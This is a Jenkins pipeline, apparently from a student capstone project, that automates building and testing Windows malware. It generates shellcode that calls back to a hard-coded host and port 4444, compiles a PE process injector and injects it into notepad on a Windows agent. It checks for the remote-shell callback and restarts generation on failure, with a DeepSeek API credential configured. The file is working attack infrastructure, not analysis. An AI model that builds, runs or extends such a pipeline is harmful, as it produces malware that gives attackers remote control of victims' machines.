pipeline {
    agent none

    environment {
        DEEPSEEK_CREDENTIALS = credentials('deepseek-api-key')
        LHOST = '100.85.95.64'
        LPORT = 4444
        HOSTNAME = 'student-virtual-machine'
        MALWARE_DIR = 'Simple/PE-Injector/PE-Injector.cpp'
        EXECUTABLE_NAME = 'injector.exe'
    }

    stages {
        stage('Checkout Code') {
            agent { label 'linux' }
            steps {
                checkout([
                    $class: 'GitSCM',
                    branches: [[name: 'staging']],
                    userRemoteConfigs: [[
                        url: 'git@github.com:sapph2c/capstone.git',
                        credentialsId: 'git-ssh'
                    ]]
                ])
            }
        }

        stage('Generate shellcode') {
            agent { label 'linux' }
            steps {
                dir('src') {
                    sh 'make LHOST=$LHOST LPORT=$LPORT HOSTNAME=$HOSTNAME all'
                }
            }
        }

        stage('Compile and Stash Malware') {
            agent { label 'linux' }
            steps {
                dir('src') {
                    sh 'x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_DIR -lpsapi'
                    stash includes: "$EXECUTABLE_NAME", name: 'compiled_malware'
                }
            }
        }

        stage('Execute Malware and Test Callback') {
            agent none
            stages {
                stage('Start Listener') {
                    agent { label 'linux' }
                    steps {
                        dir('scripts') {
                            sh '''
                                (uv run pipeline callback; echo $? > callback_result.txt) &
                                echo $! > listener.pid
                            '''
                        }
                    }
                }

                stage('Run Malware') {
                    agent { label 'windows' }
                    steps {
                        dir('testing') {
                            unstash 'compiled_malware'
                            powershell '''
                                $proc = Start-Process -FilePath 'notepad.exe' -PassThru
                                Start-Sleep -Seconds 2
                                $pid = $proc.Id
                                Write-Host "Target PID: $pid"
                                Start-Process -FilePath ".\\injector.exe" -ArgumentList $pid
                            '''
                        }
                    }
                }

                stage('Evaluate Callback') {
                    agent { label 'linux' }
                    steps {
                        dir('scripts') {
                            sh '''
                                echo "[*] Waiting for listener to complete..."
                                while kill -0 $(cat listener.pid) 2>/dev/null; do sleep 1; done
                            '''

                            script {
                                def result = sh(script: 'cat callback_result.txt', returnStdout: true).trim()
                                echo "Callback listener exited with code: ${result}"

                                if (result != '0') {
                                    currentBuild.description = 'Callback failed — restarting from Generate Shellcode'
                                    build job: env.JOB_NAME,
                                          parameters: [string(name: 'RESTART_STAGE', value: 'generate')],
                                          wait: false
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

